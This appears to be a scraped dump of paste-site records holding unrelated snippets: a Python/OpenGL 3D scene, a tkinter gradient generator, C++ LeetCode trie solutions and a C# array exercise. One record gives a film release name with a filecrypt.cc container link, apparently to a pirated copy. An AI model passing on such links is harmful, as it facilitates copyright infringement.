    Gamma = 2.0 * acos(cosAlpha*cosBeta - sinAlpha_sinBeta * dot_e1e2)

    if Gamma == 0.0:
        return 0.0, cross_e1e2 #array([1.0, 0.0, 0.0])

    E = (sinAlpha*cosBeta * e1 +
         cosAlpha*sinBeta * e2 +
         sinAlpha_sinBeta * cross_e1e2) / sin(Gamma/2.0)

    return Gamma, E


def rotation_matrix_3x3(Phi, E, I, Ex):

    '''
    CONSTRUCT 3x3 ROTATION MATRIX WITH RODRIGUES EQUATION IN MATRIX FORM
    (Wikipedia with a sign change)

    Phi = angle to rotate in radians
    E = unit axis vector
    I = np.identity(3)
    Ex = np.zeros((3,3))

    # MAKE 4x4 MATRIX
    C = rotation_matrix_3x3(Gamma, E, I3, Z3)
    C = hstack( (C, array([[0.],[0.],[0.]])) )
    C = vstack( (C, array([[0.],[0.],[0.],[1.]]).T) )

    '''

    Ex[0,1] = -E[2]
    Ex[0,2] =  E[1]

    Ex[1,0] =  E[2]
    Ex[1,2] = -E[0]

    Ex[2,0] = -E[1]
    Ex[2,1] =  E[0]

    return I - sin(Phi)*Ex + (1.0-cos(Phi))*(Ex@Ex)


def rotation_matrix_4x4(Phi, E, I, Ex):

    '''
    CONSTRUCT 4x4 ROTATION MATRIX WITH RODRIGUES IN MATRIX NOTATION
    (Wikipedia with a sign change)

    Phi = angle to rotate in radians
    E = unit axis vector
    I = np.identity(4)
    Ex = np.zeros((4,4))

    '''

    Ex[0,1] = -E[2]
    Ex[0,2] =  E[1]

    Ex[1,0] =  E[2]
    Ex[1,2] = -E[0]

    Ex[2,0] = -E[1]
    Ex[2,1] =  E[0]

    if 1:

        return I - sin(Phi)*Ex + (1.0-cos(Phi))*(Ex@Ex)

    else:

        # Eulers' representation (?)
        E = concatenate((E, [0.0]))
        EE_T = E*E.T # = np.outer(E,E)
        return cos(Phi) * (I - EE_T) - sin(Phi)*Ex + EE_T


def make_ground():

    g.hatch_ground = glGenLists(1)
    glNewList(g.hatch_ground, GL_COMPILE)

    gr = 0.0
    s = 200.0
    xmin = -15000
    xmax =  15000
    zmin = -15000
    zmax =  15000

    glLineWidth(2.0)

    glBegin(GL_LINES)
    for x in arange(xmin, xmax, s):
        for z in arange(zmin, zmax, s):
            glVertex3f(x,   gr, z)
            glVertex3f(x+s, gr, z)
            glVertex3f(x,   gr, z)
            glVertex3f(x,   gr, z+s)
    glEnd()

    glEndList()


def make_hoops1():

    g.square_hoops1 = glGenLists(1)
    glNewList(g.square_hoops1, GL_COMPILE)

    x = 0.0
    y = 300.0
    size = 50.0
    angle = 0.0
    glLineWidth(3.0)

    for z in arange(-15000., 5250., 600.):
        y += 100*sin(-z/500.0)
        x += 170*sin(-z/500.0)
        glBegin(GL_QUADS)
        glVertex3f(x-size, y-size, z)
        glVertex3f(x+size, y-size, z)
        glVertex3f(x+size, y+size, z)
        glVertex3f(x-size, y+size, z)
        glEnd()

    glEndList()


def make_hoops2():

    g.square_hoops2 = glGenLists(1)
    glNewList(g.square_hoops2, GL_COMPILE)

    z = 0.0
    y = 300.0
    size = 50.0
    angle = 0.0
    glLineWidth(3.0)

    for x in arange(-15090., 5250., 600.):
        y += 100*sin(-x/500.0)
        z += 170*sin(-x/500.0)
        glBegin(GL_QUADS)
        glVertex3f(x, y-size, z-size)
        glVertex3f(x, y-size, z+size)
        glVertex3f(x, y+size, z+size)
        glVertex3f(x, y+size, z-size)
        glEnd()

    glEndList()


def gl_init(screenwidth, screenheight, FULL_SCREEN):

    g.screen = pygame.display.set_mode((screenwidth, screenheight),
                    DOUBLEBUF|OPENGL|FULL_SCREEN*FULLSCREEN)

    # THIS IS A PROBLEM ON LENOVO
    glBlendFunc(GL_SRC_ALPHA, GL_ONE_MINUS_SRC_ALPHA)

    glEnable(GL_BLEND)
    # ~ glDisable(GL_BLEND)

    glEnable(GL_LINE_SMOOTH)
    glEnable(GL_POLYGON_SMOOTH)

    glEnable(GL_DEPTH_TEST)
    glDepthFunc(GL_LESS)
    glPolygonMode(GL_FRONT_AND_BACK, GL_LINE)

    glEnable(GL_FOG)
    fogColor = (0.0, 0.0, 0.0, 1.0)
    glFogi(GL_FOG_MODE, GL_LINEAR)
    glFogfv(GL_FOG_COLOR, fogColor)
    glFogf(GL_FOG_DENSITY, 0.3)
    glHint(GL_FOG_HINT, GL_NICEST)
    glFogf(GL_FOG_START, 1000.0)
    glFogf(GL_FOG_END, 5000.0)

    glClearColor(0.0, 0.0, 0.0, 1.0)
    glClear(GL_COLOR_BUFFER_BIT|GL_DEPTH_BUFFER_BIT)

    glMatrixMode(GL_PROJECTION)
    glLoadIdentity()
    gluPerspective(60.0, screenwidth/screenheight, 1.0, 10000.0)

    glMatrixMode(GL_MODELVIEW)
    glLoadIdentity()

class g: ...

if __name__ == '__main__':
    sys.exit(main())



"
tFuX20nS,# 512x512_rgb_gradient_ctrl_2.py,here2share,Python,Tuesday 19th of December 2023 05:55:54 PM CDT,"# 512x512_rgb_gradient_ctrl_2.py

import tkinter as tk
import random
from PIL import Image, ImageTk, ImageFilter

ww = 512
hh = 512

root = tk.Tk()
root.title(""512x512_image_generator"")
root.geometry(""%dx%d+%d+%d"" %(ww, hh, 10, 10))

canvas = tk.Canvas(root, width=ww, height=hh)
canvas.pack()

def generate(event=None):
	for size in layers:
		interpolate(size)
	draw()

def interpolate(size):
	img = Image.new(""RGBA"", (size, size))
	pixels = img.load()
	for y in range(size):
		for x in range(size):
			red = random.randint(0, 255)
			green = random.randint(0, 255)
			blue = random.randint(0, 255)
			pixels[x, y] = (red, green, blue, 255)
	img = img.resize((ww, hh))
	layers[size] = img

def draw(event=None):
	buffer = Image.new(""RGBA"", (ww, hh), (255, 255, 255, 255))
	for size, layer_image in layers.items():
		if size != 4:
			alpha = float(opacity_slider[size].get()) / 2056.0
		else:
			alpha = 1
		buffer = Image.blend(buffer, layer_image, alpha)
	
	contour_layer = buffer.point(lambda x: x // 128 * 128)
	buffer = Image.blend(buffer, contour_layer, 0.05)
	
	photo = ImageTk.PhotoImage(buffer)
	canvas.create_image(0, 0, anchor=tk.NW, image=photo)
	canvas.image = photo

opacity_label = tk.Toplevel(root)
opacity_title = tk.Label(opacity_label, text=""Press Spacebar To Randomize"")
opacity_title.pack()
opacity_slider = {}
layers = {}

size = 4
interpolate(size)
while size + 6 < 32:
	size += 7
	opacity_slider[size] = tk.Scale(opacity_label, from_=512, to=0, orient=tk.VERTICAL, label=size, command=draw)
	opacity_slider[size].pack(side=tk.LEFT, fill='both', expand=True)
	opacity_slider[size].set(5)
	interpolate(size)

canvas.update()
t = opacity_label.winfo_width()
opacity_label.geometry(""%dx300+%d+%d"" %(t, 50, 50))
for t in (root, opacity_label):
	t.bind(""<space>"", generate)
opacity_label.wm_transient(root)

draw()
root.mainloop()"
YA72Xpb4,Warum.Manner.Nicht.Zuhoren.2007.Deu.720p.h264.ac3.Subs-bp,bpmircea,BrainFuck,Tuesday 19th of December 2023 05:16:40 PM CDT,"Warum Männer nicht zuhören und Frauen schlecht einparken (Why Men Don't Listen and Women Can't Read Maps) (Leander Haußmann, 2007)
aka
Warum.Manner.Nicht.Zuhoren.2007.Deu.720p.h264.ac3.Subs-bp
https://www.imdb.com/title/tt0889139/

https://filecrypt.cc/Container/B7A6632F86.html"
j268hpGY,Longest Word in Dictionary - Leetcode,Martin_Toseski,C++,Tuesday 19th of December 2023 05:13:20 PM CDT,"//Longest Word in Dictionary
class Solution {
public:
    struct Node {
        int cnt;
        Node* next[26];
        bool isWord;

        Node() {
            cnt = 0;
            memset(next, NULL, sizeof(next));
            isWord = false;
        }
    };

    struct Trie {
        Node* root;

        Trie() {
            root = new Node();
        }

        void insert(string word) {
            Node* curr = root;

            for (char c : word) {
                curr->cnt++;

                if (curr->next[c-'a'] == NULL) {
                    curr->next[c-'a'] = new Node();
                }

                curr = curr->next[c-'a'];
            }

            curr->cnt++;
            curr->isWord = true;
        }

        bool searchWord(string word) {
            Node* curr = root;

            for (char c : word) {
                if (curr->next[c-'a'] == NULL || !curr->next[c-'a']->isWord) {
                    return false;
                }

                curr = curr->next[c-'a'];
            }

            if (curr->isWord) {
                return true;
            }

            return false;
        }
    };

    string longestWord(vector<string>& words) {
        Trie t;

        int longest=0;
        string lexico_lowest = """";

        for (auto next : words) {
            t.insert(next);
        }

        for (auto next : words) {
            if (t.searchWord(next)) {
                if (next.size() > longest) {
                    longest = next.size();
                    lexico_lowest = next;
                }
                else if (next.size() == longest) {
                    if (lexico_lowest == """") {
                        lexico_lowest = next;
                    }
                    else if (next < lexico_lowest) {
                        lexico_lowest = next;
                    }
                }
            }
        }

        return lexico_lowest;
    }
};

/********************DRUGATA ZADACA********************/

//Replace Words
// Longest Substring Without Repeating Characters
class Solution {
public:
    struct Node {
        int cnt;
        Node* next[26];
        bool isWord;

        Node() {
            cnt=0;
            memset(next, NULL, sizeof(next));
            isWord = false;
        }
    };

    struct Trie {
        Node* root;

        Trie() {
            root = new Node();
        }

        void insert(string word) {
            Node* curr = root;

            for (char c : word) {
                curr->cnt++;

                if (curr->next[c-'a'] == NULL) {
                    curr->next[c-'a'] = new Node();
                }

                curr = curr->next[c-'a'];
            }

            curr->cnt++;
            curr->isWord = true;
        }

        void print(Node* curr, string word) {
            if (curr->isWord) {
                cout << word << "" "";
            }

            for (int i=0; i < 26; i++) {
                if (curr->next[i] != NULL) {
                    print(curr->next[i], word + char('a' + i));
                }
            }
        }

        string shortestRoot(string word) {
            string ans = """";
            Node* curr = root;

            for (char c : word) {
                if (curr->next[c-'a'] == NULL) {
                    if (curr->isWord) {
                        return ans;
                    }
                    else {
                        return """";
                    }
                }

                ans += c;

                curr = curr->next[c-'a'];

                if (curr->isWord) {
                    return ans;
                }
            }

            return ans;
        }
    };

    string replaceWords(vector<string>& dictionary, string sentence) {
        Trie t;

        vector<string> sentence_words;
        string temp = """";
        for (auto c : sentence) {
            if (isalpha(c)) {
                temp += c;
            }
            else {
                sentence_words.push_back(temp);
                temp = """";
            }
        }

        sentence_words.push_back(temp);

        for (auto next : dictionary) {
//            cout << next << "" "";
            t.insert(next);
        }

//        cout << endl;

        t.print(t.root, """");
//        cout << endl;

        for (int i=0; i < sentence_words.size(); i++) {
            string next = sentence_words[i];

            string change = t.shortestRoot(next);
//            cout << next << "" "" << change << endl;
            if (change != """") {
                sentence_words[i] = change;
            }
        }

        string ans;

        for (int i=0; i < sentence_words.size(); i++) {
            ans += sentence_words[i];
            if (i != sentence_words.size()-1) {
                ans += "" "";
            }
        }

        return ans;
    }
};
"
ZtTsuqK3,Untitled,A_E_Ivanov,C#,Tuesday 19th of December 2023 04:58:12 PM CDT,"internal class Program
{
    private static void Main(string[] args)
    {
        //съсдаваме масив на който да му бъдат подадени дани от потребителя

        int[] array = Console.ReadLine().Split(new char[] { ' ', ',' }, StringSplitOptions.RemoveEmptyEntries).Select(int.Parse).ToArray();

        int firstNumber = array[0];

        //създаваме празен лист, първо ще обходим масива (array) , число по число като започнем от вторият елемент.
        //ще го направим с два цикъла. Първият път ще търсим числа по-малки от първият елемент (firstNumber). Намеренти ще ги записваме в list.
        //после ще добавим първият елемт от оригиналният масив , а след това числата който са равни или по-големи от него.

        List<int> list = new List<int>();

        for (int i = 1; i < array.Length; i++)
        {
            int currentNumber = array[i];

            if (currentNumber < firstNumber)
            {
                list.Add(currentNumber);
            }
        }

        list.Add(firstNumber);

        for (int i = 1; i < array.Length; i++)
        {
            int currentNumber = array[i];

            if (currentNumber >= firstNumber) 
            {
                list.Add(currentNumber);
            }
        }

        /*
         Zero Tests:
         8,5,19,4,7,15,6,6
         5,4,7,6,6,8,19,15
        */

        Console.WriteLine(string.Join("" "", list));
    }
}"
